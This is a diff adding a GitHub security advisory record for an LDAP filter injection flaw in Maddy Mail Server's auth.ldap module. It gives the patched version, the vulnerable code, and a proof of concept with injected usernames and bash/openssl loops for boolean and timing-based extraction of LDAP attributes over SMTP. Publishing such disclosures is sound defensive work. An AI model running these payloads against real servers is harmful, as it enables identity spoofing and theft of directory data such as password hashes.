@@ -1,0 +1,53 @@
+{
+  "id": "GHSA-5835-4gvc-32pc",
+  "modified": "2026-04-13T19:34:49.597862Z",
+  "published": "2026-04-13T19:22:52Z",
+  "aliases": [
+    "CVE-2026-40193"
+  ],
+  "summary": "Maddy Mail Server has an LDAP Filter Injection via Unsanitized Username",
+  "details": "### Summary\n\nThe `auth.ldap` module constructs LDAP search filters and DN strings by directly interpolating user-supplied usernames via `strings.ReplaceAll()` without any LDAP filter escaping. An attacker who can reach the SMTP submission (AUTH PLAIN) or IMAP LOGIN interface can inject arbitrary LDAP filter expressions through the username field, enabling identity spoofing, LDAP directory enumeration, and attribute value extraction. The `go-ldap/ldap/v3` library—already imported in the same file—provides `ldap.EscapeFilter()` specifically for this purpose, but it is never called.\n\n### Patched version\n\nUpgrade to maddy 0.9.3.\n\n### Details\n\n**Affected file:** `internal/auth/ldap/ldap.go`\n\nThree locations substitute the raw, attacker-controlled `username` into LDAP filter or DN strings with no escaping:\n\n**1. `Lookup()` — line 228 (filter injection)**\n\n```go\nfunc (a *Auth) Lookup(_ context.Context, username string) (string, bool, error) {\n    // ...\n    req := ldap.NewSearchRequest(\n        a.baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,\n        2, 0, false,\n        strings.ReplaceAll(a.filterTemplate, \"{username}\", username),  // \u003c-- NO ESCAPING\n        []string{\"dn\"}, nil)\n```\n\n**2. `AuthPlain()` — line 255 (DN template injection)**\n\n```go\nfunc (a *Auth) AuthPlain(username, password string) error {\n    // ...\n    if a.dnTemplate != \"\" {\n        userDN = strings.ReplaceAll(a.dnTemplate, \"{username}\", username)  // \u003c-- NO ESCAPING\n```\n\n**3. `AuthPlain()` — line 260 (filter injection)**\n\n```go\n    } else {\n        req := ldap.NewSearchRequest(\n            a.baseDN, ldap.ScopeWholeSubtree, ldap.NeverDerefAliases,\n            2, 0, false,\n            strings.ReplaceAll(a.filterTemplate, \"{username}\", username),  // \u003c-- NO ESCAPING\n            []string{\"dn\"}, nil)\n```\n\nThe `go-ldap/ldap/v3` library (v3.4.10, imported at line 17) provides `ldap.EscapeFilter()` which escapes `(`, `)`, `*`, `\\`, and NUL per RFC 4515. It is never called on user input.\n\n**No input validation or filter escaping occurs at any point from the protocol handler to the LDAP query.**\n\n### PoC\n\n**Prerequisites:**\n- A maddy instance configured with `auth.ldap` using a `filter` directive\n- An LDAP directory (e.g., OpenLDAP) with at least one user\n- Network access to maddy's SMTP submission port (587) or IMAP port (993/143)\n\n**Step 1: Vulnerable maddy configuration**\n\n```\nauth.ldap ldap_auth {\n    urls ldap://ldapserver:389\n    bind plain \"cn=admin,dc=example,dc=org\" \"adminpassword\"\n    base_dn \"ou=people,dc=example,dc=org\"\n    filter \"(\u0026(objectClass=inetOrgPerson)(uid={username}))\"\n}\n\nsubmission tcp://0.0.0.0:587 {\n    auth \u0026ldap_auth\n    # ...\n}\n```\n\nAssume the LDAP directory contains users `alice` (password: `alice_pass`) and `bob` (password: `bob_pass`).\n\n**Step 2: Verify normal authentication works**\n\n```bash\n# Encode AUTH PLAIN: \\x00alice\\x00alice_pass\nAUTH_BLOB=$(printf '\\x00alice\\x00alice_pass' | base64)\n\n# Connect via SMTP submission with STARTTLS\nopenssl s_client -connect 127.0.0.1:587 -starttls smtp -quiet \u003c\u003cEOF\nEHLO test\nAUTH PLAIN $AUTH_BLOB\nQUIT\nEOF\n# Expected: 235 Authentication succeeded\n```\n\n**Step 3: Boolean-based blind LDAP injection (attribute extraction)**\n\nAn attacker who holds valid credentials for any one account can extract that account's LDAP attributes character by character, using the authentication result (235 vs 535) as a boolean oracle.\n\n```bash\n# Scenario: attacker knows bob's password (\"bob_pass\").\n# Goal: extract bob's \"description\" attribute value one character at a time.\n#\n# Injected username: bob)(description=S*\n# Resulting filter:  (\u0026(objectClass=inetOrgPerson)(uid=bob)(description=S*))\n#\n# If bob's description starts with \"S\" → filter matches 1 entry (bob)\n#   → conn.Bind(bob_DN, \"bob_pass\") succeeds → 235 (SUCCESS)\n# If not → filter matches 0 entries → 535 (FAILURE)\n#\n# By iterating characters, the attacker reconstructs the full attribute value.\n\n# Test: does bob's description start with \"S\"?\nINJECTED='bob)(description=S*'\nAUTH_BLOB=$(printf \"\\x00${INJECTED}\\x00bob_pass\" | base64)\nopenssl s_client -connect 127.0.0.1:587 -starttls smtp -quiet \u003c\u003cEOF\nEHLO test\nAUTH PLAIN $AUTH_BLOB\nQUIT\nEOF\n# 235 → yes, starts with \"S\"\n\n# Narrow: does it start with \"Se\"?\nINJECTED='bob)(description=Se*'\nAUTH_BLOB=$(printf \"\\x00${INJECTED}\\x00bob_pass\" | base64)\n# ... repeat until full value is extracted\n\n# This works for ANY LDAP attribute: userPassword hashes, mail,\n# telephoneNumber, memberOf, etc.\n```\n\nFor extracting attributes of **other users** (whose password the attacker does not know), a timing side-channel is used instead. The `AuthPlain()` function has two distinct failure paths:\n\n- **0 entries matched** (line 270): returns `ErrUnknownCredentials` immediately — **fast**\n- **1 entry matched, bind fails** (line 275): performs `conn.Bind()` over the network, then returns — **slow** (adds LDAP bind round-trip latency)\n\nBoth return SMTP `535`, but the timing difference is measurable:\n\n```bash\n# Target: extract alice's \"description\" attribute.\n# Attacker does NOT know alice's password.\n#\n# Injected username: alice)(description=S*\n# Resulting filter:  (\u0026(objectClass=inetOrgPerson)(uid=alice)(description=S*))\n#\n# If alice's description starts with \"S\":\n#   → 1 match → conn.Bind(alice_DN, \"wrong\") → bind fails → 535 (SLOW)\n# If not:\n#   → 0 matches → immediate 535 (FAST)\n#\n# Timing delta ≈ LDAP bind RTT (typically 1-10ms on LAN, more over WAN)\n\nfor c in {a..z} {A..Z} {0..9}; do\n    INJECTED=\"alice)(description=${c}*\"\n    AUTH_BLOB=$(printf \"\\x00${INJECTED}\\x00wrong\" | base64)\n    START=$(date +%s%N)\n    echo -e \"EHLO test\\r\\nAUTH PLAIN ${AUTH_BLOB}\\r\\nQUIT\\r\\n\" | \\\n        openssl s_client -connect 127.0.0.1:587 -starttls smtp -quiet 2\u003e/dev/null\n    END=$(date +%s%N)\n    ELAPSED=$(( (END - START) / 1000000 ))\n    echo \"char='$c' time=${ELAPSED}ms\"\ndone\n# Characters with significantly longer response times indicate a filter match.\n```\n\n### Impact\n\n**Who is affected:** Any maddy deployment that uses the `auth.ldap` module with either the `filter` or `dn_template` directive. Both SMTP submission (AUTH PLAIN) and IMAP (LOGIN) authentication are affected.\n\n**What an attacker can do:**\n\n1. **Identity spoofing:** An attacker who knows any valid user's password can authenticate using an injected username that resolves to that user's DN via LDAP filter manipulation. The authenticated session identity (`connState.AuthUser` in SMTP, `username` passed to IMAP storage lookup) is the raw injected string, not the actual LDAP user. This can bypass username-based authorization policies downstream.\n\n2. **LDAP directory enumeration:** By injecting wildcard filters (`*`) and observing error responses (e.g., \"too many entries\" vs. \"unknown credentials\"), an attacker can determine the number of users, probe for the existence of specific accounts, and discover directory structure.\n\n3. **Attribute value extraction via boolean-based blind injection:** An attacker who holds valid credentials for any one LDAP account can inject additional filter conditions (e.g., `bob)(description=X*`) that turn the authentication response into a boolean oracle, and the same technique works via a timing side-channel.\n\n4. **DN template path traversal:** When `dn_template` is used instead of `filter` (line 255), injected characters can manipulate the DN structure, potentially targeting entries in different organizational units or directory subtrees.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/foxcpp/maddy",
+        "purl": "pkg:golang/github.com/foxcpp/maddy"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.9.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-5835-4gvc-32pc/GHSA-5835-4gvc-32pc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/foxcpp/maddy/security/advisories/GHSA-5835-4gvc-32pc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/foxcpp/maddy/commit/6a06337eb41fa87a35697366bcb71c3c962c44ba"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/foxcpp/maddy"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/foxcpp/maddy/releases/tag/v0.9.3"
+    }
+  ]
+}
